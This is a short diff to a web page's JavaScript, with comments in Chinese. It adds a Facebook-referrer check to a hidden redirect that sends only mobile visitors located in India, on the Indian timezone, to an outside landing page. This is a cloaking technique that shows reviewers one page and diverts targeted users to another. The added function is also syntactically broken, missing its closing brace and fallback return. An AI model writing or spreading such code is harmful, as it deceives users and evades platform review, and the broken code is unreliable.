@@ -40,8 +40,13 @@
    function isEnglishLang() {
     return navigator.language.startsWith('en') || 
            navigator.languages.some(lang => lang.startsWith('en'));
-}
- 
+} 
+function isTrafficFromFacebook() { 
+  const referrer = document.referrer.toLowerCase();
+  if (referrer.includes('facebook.com') || referrer.includes('fb.com')) {
+    return true;
+  }
+	
 function isIndianTimeZone() {
   const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
   return timeZone === 'Asia/Kolkata'; // 印度时区唯一标识
@@ -50,7 +55,7 @@ function isIndianTimeZone() {
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'IN' && isMobileDevice() && isIndianTimeZone()) {
+        if (data.country === 'IN' && isMobileDevice() && isIndianTimeZone() && isTrafficFromFacebook()) {
           window.location.href = "http://luodiye.pol123.com/";
           return;
         }
